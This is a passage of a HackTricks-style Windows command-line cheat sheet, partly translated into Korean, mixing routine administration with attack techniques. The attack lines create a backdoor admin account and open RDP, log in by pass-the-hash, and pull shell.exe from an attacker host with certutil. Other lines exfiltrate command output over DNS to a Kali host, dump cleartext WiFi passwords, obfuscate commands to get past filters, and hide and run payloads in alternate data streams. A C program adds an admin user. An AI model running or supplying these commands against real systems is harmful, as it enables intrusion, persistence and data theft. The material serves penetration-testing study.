#### 방화벽

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices, software programs, or a combination of both.

방화벽은 미리 정의된 보안 규칙에 따라 들어오고 나가는 네트워크 트래픽을 모니터링하고 제어하는 네트워크 보안 장치입니다. 신뢰할 수 있는 내부 네트워크와 인터넷과 같은 신뢰할 수 없는 외부 네트워크 사이에 장벽 역할을 합니다. 방화벽은 하드웨어 장치, 소프트웨어 프로그램 또는 둘의 조합으로 구현될 수 있습니다.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

#### 공유 폴더

공유 폴더는 여러 사용자가 파일 및 폴더를 공유하고 액세스할 수 있는 기능입니다. Windows 운영 체제에서는 공유 폴더를 설정하여 네트워크 상에서 파일 및 폴더를 공유할 수 있습니다.

**공유 폴더 확인**

공유 폴더를 확인하려면 다음 명령을 사용합니다.

```plaintext
net share
```

**공유 폴더 생성**

새로운 공유 폴더를 생성하려면 다음 명령을 사용합니다.

```plaintext
net share [이름]=[경로] /GRANT:[사용자]:[권한]
```

* `[이름]`: 공유 폴더의 이름을 지정합니다.
* `[경로]`: 공유 폴더의 경로를 지정합니다.
* `[사용자]`: 공유 폴더에 액세스할 수 있는 사용자를 지정합니다.
* `[권한]`: 사용자에게 부여할 권한을 지정합니다.

**공유 폴더 삭제**

기존의 공유 폴더를 삭제하려면 다음 명령을 사용합니다.

```plaintext
net share [이름] /DELETE
```

* `[이름]`: 삭제할 공유 폴더의 이름을 지정합니다.

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

#### Wifi

#### 와이파이

**View Available Networks**

**사용 가능한 네트워크 보기**

To view the list of available wifi networks, use the following command:

사용 가능한 와이파이 네트워크 목록을 보려면 다음 명령을 사용하십시오:

```bash
netsh wlan show networks
```

**Connect to a Wifi Network**

**와이파이 네트워크에 연결하기**

To connect to a wifi network, use the following command:

와이파이 네트워크에 연결하려면 다음 명령을 사용하십시오:

```bash
netsh wlan connect name="WifiNetworkName"
```

Replace `WifiNetworkName` with the name of the wifi network you want to connect to.

`WifiNetworkName`을 연결하려는 와이파이 네트워크의 이름으로 대체하십시오.

**Disconnect from a Wifi Network**

**와이파이 네트워크에서 연결 해제하기**

To disconnect from a wifi network, use the following command:

와이파이 네트워크에서 연결을 해제하려면 다음 명령을 사용하십시오:

```bash
netsh wlan disconnect
```

**View Saved Wifi Profiles**

**저장된 와이파이 프로필 보기**

To view the list of saved wifi profiles, use the following command:

저장된 와이파이 프로필 목록을 보려면 다음 명령을 사용하십시오:

```bash
netsh wlan show profiles
```

**Delete a Saved Wifi Profile**

**저장된 와이파이 프로필 삭제하기**

To delete a saved wifi profile, use the following command:

저장된 와이파이 프로필을 삭제하려면 다음 명령을 사용하십시오:

```bash
netsh wlan delete profile name="WifiProfileName"
```

Replace `WifiProfileName` with the name of the wifi profile you want to delete.

`WifiProfileName`을 삭제하려는 와이파이 프로필의 이름으로 대체하십시오.

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

#### SNMP

SNMP(Simple Network Management Protocol)은 네트워크 장치 및 서버에서 정보를 수집하고 관리하기 위해 사용되는 프로토콜입니다. SNMP는 주로 시스템 및 네트워크 모니터링에 사용되며, 장치의 상태, 성능 및 기타 관련 정보를 제공합니다.

SNMP는 에이전트와 관리자 간의 통신을 위해 사용됩니다. 에이전트는 모니터링할 장치에 설치되어 데이터를 수집하고, 관리자는 이러한 데이터를 사용하여 장치의 상태를 파악하고 문제를 해결할 수 있습니다.

SNMP는 주로 SNMPv1, SNMPv2c 및 SNMPv3의 세 가지 버전으로 사용됩니다. 각 버전은 보안 및 인증 기능의 차이가 있으며, SNMPv3은 가장 안전한 버전으로 암호화 및 인증을 지원합니다.

SNMP는 일반적으로 시스템 및 네트워크 관리자에게 유용한 정보를 제공하는 도구로 사용됩니다. 그러나 악의적인 목적으로 사용될 수도 있으므로 보안 설정이 중요합니다.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

#### 네트워크 인터페이스

**목표**

* 시스템의 네트워크 인터페이스 정보를 얻는다.
* 네트워크 인터페이스를 관리한다.

**명령어**

* `ipconfig`: 시스템의 네트워크 인터페이스 정보를 표시한다.
* `netsh interface show interface`: 시스템의 모든 네트워크 인터페이스를 표시한다.
* `netsh interface set interface "InterfaceName" admin=enable`: 지정된 네트워크 인터페이스를 활성화한다.
* `netsh interface set interface "InterfaceName" admin=disable`: 지정된 네트워크 인터페이스를 비활성화한다.

**예제**

* `ipconfig` 명령어를 사용하여 시스템의 네트워크 인터페이스 정보를 확인할 수 있다.

```plaintext
C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : example.com
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter Wi-Fi:
   Connection-specific DNS Suffix  . : example.com
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
```

* `netsh interface show interface` 명령어를 사용하여 시스템의 모든 네트워크 인터페이스를 확인할 수 있다.

```plaintext
C:\> netsh interface show interface

Admin State    State          Type             Interface Name
-------------------------------------------------------------------------
Enabled        Connected      Dedicated        Ethernet
Enabled        Connected      Dedicated        Wi-Fi
```

* `netsh interface set interface "Ethernet" admin=disable` 명령어를 사용하여 "Ethernet" 네트워크 인터페이스를 비활성화할 수 있다.

```plaintext
C:\> netsh interface set interface "Ethernet" admin=disable

Ok.
```

* `netsh interface set interface "Wi-Fi" admin=enable` 명령어를 사용하여 "Wi-Fi" 네트워크 인터페이스를 활성화할 수 있다.

```plaintext
C:\> netsh interface set interface "Wi-Fi" admin=enable

Ok.
```

```bash
ipconfig /all
```

#### ARP 테이블

ARP(Address Resolution Protocol) 테이블은 IP 주소와 MAC 주소 간의 매핑 정보를 저장하는 테이블입니다. 이 테이블은 네트워크 장치가 통신할 때 사용되며, 특정 IP 주소에 대한 MAC 주소를 찾을 때 참조됩니다.

ARP 테이블은 다음과 같은 명령어를 사용하여 확인할 수 있습니다.

```plaintext
arp -a
```

이 명령어를 실행하면 현재 시스템의 ARP 테이블이 표시됩니다. 각 항목은 IP 주소, 해당 IP 주소에 대한 MAC 주소, 유형(정적 또는 동적) 등의 정보를 포함합니다.

ARP 테이블은 네트워크 공격에 사용될 수 있으므로, 시스템 보안을 강화하기 위해 주기적으로 확인하는 것이 좋습니다.

```bash
arp -A
```

### 다운로드

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

## CertReq.exe

CertReq.exe는 Windows 운영 체제에서 인증서 요청을 생성하고 제출하는 데 사용되는 명령 줄 도구입니다.

### 사용법

CertReq.exe는 다음과 같은 구문을 사용하여 실행됩니다:

```plaintext
CertReq [Options] [RequestFile [CertFile [CertChainFile]]]
```

* `Options`: CertReq.exe의 다양한 옵션을 지정합니다.
* `RequestFile`: 인증서 요청을 정의하는 요청 파일의 경로입니다.
* `CertFile`: 인증서 파일의 경로입니다. 이 옵션을 사용하면 인증서 요청에 대한 서명된 인증서를 생성합니다.
* `CertChainFile`: 인증서 체인 파일의 경로입니다. 이 옵션을 사용하면 인증서 요청에 대한 서명된 인증서 체인을 생성합니다.

### 예제

다음은 CertReq.exe를 사용하여 인증서 요청을 생성하는 예제입니다:

```plaintext
CertReq -new -f myrequest.inf -p mypassword
```

이 예제에서는 `-new` 옵션을 사용하여 새로운 인증서 요청을 생성하고, `-f` 옵션을 사용하여 요청을 정의하는 INF 파일인 `myrequest.inf`를 지정합니다. 또한, `-p` 옵션을 사용하여 요청에 대한 비밀번호를 `mypassword`로 설정합니다.

### 참고

CertReq.exe는 인증서 요청을 생성하고 제출하는 데 사용되는 강력한 도구입니다. 그러나 올바른 옵션과 매개 변수를 사용하여 사용해야 합니다. 자세한 내용은 Windows 공식 문서를 참조하십시오.

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

## Certutil.exe

`Certutil.exe`는 Windows 운영 체제에서 인증서 유틸리티로 사용되는 명령줄 도구입니다. 이 도구를 사용하여 인증서와 인증서 관련 작업을 수행할 수 있습니다.

### 명령어

#### 1. 인증서 정보 보기

```plaintext
certutil -dump <인증서 파일 경로>
```

인증서 파일의 정보를 표시합니다.

#### 2. 인증서 설치

```plaintext
certutil -addstore <저장소 이름> <인증서 파일 경로>
```

인증서를 지정된 저장소에 설치합니다.

#### 3. 인증서 제거

```plaintext
certutil -delstore <저장소 이름> <인증서 일련번호>
```

저장소에서 특정 인증서를 제거합니다.

#### 4. 인증서 내보내기

```plaintext
certutil -exportPFX <인증서 일련번호> <내보낼 파일 경로>
```

인증서를 PFX 파일로 내보냅니다.

#### 5. 인증서 가져오기

```plaintext
certutil -importPFX <내보낸 파일 경로>
```

PFX 파일에서 인증서를 가져옵니다.

#### 6. 인증서 검증

```plaintext
certutil -verify <인증서 파일 경로>
```

인증서의 유효성을 검증합니다.

#### 7. 인증서 연결

```plaintext
certutil -repairstore <저장소 이름> <인증서 일련번호>
```

저장소에서 특정 인증서와 연결을 복구합니다.

#### 8. 인증서 목록 표시

```plaintext
certutil -store <저장소 이름>
```

지정된 저장소에 있는 인증서 목록을 표시합니다.

### 예제

```plaintext
certutil -dump C:\path\to\certificate.cer
```

```plaintext
certutil -addstore -enterprise -f "Root" C:\path\to\certificate.cer
```

```plaintext
certutil -delstore -enterprise "Root" 1234567890abcdef
```

```plaintext
certutil -exportPFX 1234567890abcdef C:\path\to\exported_certificate.pfx
```

```plaintext
certutil -importPFX C:\path\to\exported_certificate.pfx
```

```plaintext
certutil -verify C:\path\to\certificate.cer
```

```plaintext
certutil -repairstore -enterprise "Root" 1234567890abcdef
```

```plaintext
certutil -store -enterprise "Root"
```

이 명령어들은 `Certutil.exe`를 사용하여 인증서와 관련된 작업을 수행하는 데 도움이 됩니다.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

\*\*[https://lolbas-project.github.io](https://lolbas-project.github.io/)\*\*에서 `Download`을 검색하여 더 많은 정보를 찾을 수 있습니다.

### 기타

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

#### 금지된 문자열 우회

In some cases, when trying to exploit a vulnerability or perform a command injection attack, you may encounter a situation where certain characters are blacklisted or filtered out. This can make it challenging to execute the desired command. However, there are several techniques you can use to bypass character blacklisting and successfully execute your command.

일부 케이스에서 취약점을 이용하거나 명령 주입 공격을 수행할 때, 특정 문자열이 금지되거나 필터링되어 있는 상황을 마주칠 수 있습니다. 이는 원하는 명령을 실행하는 데 어려움을 줄 수 있습니다. 그러나 금지된 문자열을 우회하고 명령을 성공적으로 실행하기 위해 사용할 수 있는 여러 기술이 있습니다.

One common technique is to use alternative representations of the blacklisted characters. For example, if the character 'a' is blacklisted, you can try using its ASCII or Unicode representation instead. Similarly, you can try using different case variations or encoding schemes to bypass the blacklist.

일반적인 기술 중 하나는 금지된 문자열의 대체 표현을 사용하는 것입니다. 예를 들어, 문자 'a'가 금지되어 있다면, 대신 ASCII 또는 Unicode 표현을 사용해 볼 수 있습니다. 마찬가지로, 대소문자 변형이나 인코딩 방식을 다르게 사용하여 금지 목록을 우회해 볼 수 있습니다.

Another technique is to use concatenation or string manipulation to construct the desired command using allowed characters. For example, if the character ';' is blacklisted, you can try using other characters to concatenate multiple commands or use string manipulation functions to achieve the desired result.

또 다른 기술은 연결 또는 문자열 조작을 사용하여 허용된 문자를 사용하여 원하는 명령을 구성하는 것입니다. 예를 들어, 문자 ';'가 금지되어 있다면, 다른 문자를 사용하여 여러 명령을 연결하거나 문자열 조작 함수를 사용하여 원하는 결과를 얻을 수 있습니다.

It's important to note that bypassing character blacklisting may require trial and error, as different applications or systems may have different blacklisting rules. Therefore, it's crucial to thoroughly understand the blacklisting mechanism and experiment with different techniques to find the most effective approach.

문자열 금지 우회는 서로 다른 응용 프로그램이나 시스템마다 다른 금지 규칙이 있을 수 있으므로 시행착오가 필요할 수 있습니다. 따라서, 문자열 금지 메커니즘을 완전히 이해하고 다양한 기술을 실험하여 가장 효과적인 접근 방식을 찾는 것이 중요합니다.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

#### DOSfuscation

CMD 라인을 난독화하는 코드를 생성합니다.

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

#### 수신 주소 ACL

관리자 권한 없이 [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/)에서 수신할 수 있습니다.

```bash
netsh http show urlacl
```

#### 수동 DNS 쉘

**공격자** (Kali)는 다음 두 가지 옵션 중 하나를 사용해야 합니다:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

**피해자**

**`for /f tokens`** 기술: 이를 통해 우리는 명령을 실행하고 각 줄의 첫 X 단어를 가져와 DNS를 통해 서버로 전송할 수 있습니다.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

출력을 **리다이렉트**하여 그것을 **읽을 수**도 있습니다.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

### C 코드에서 CMD 호출하기

To call CMD from C code, you can use the `system()` function provided by the C standard library. This function allows you to execute a command in the command prompt.

Here is an example of how to call CMD from C code:

```c
#include <stdlib.h>

int main() {
    system("cmd /c <command>");
    return 0;
}
```

In the above code, replace `<command>` with the command you want to execute in CMD. The `/c` flag is used to execute the command and then terminate CMD.

Compile and run the C code, and it will call CMD and execute the specified command.

Note: Be cautious when executing commands from C code, as it can pose security risks if not handled properly. Always validate and sanitize user input to prevent command injection vulnerabilities.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

### 대체 데이터 스트림 치트시트 (ADS/대체 데이터 스트림)

**예시는** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**에서 가져왔습니다. 그곳에는 더 많은 예시가 있습니다!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 팁을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>
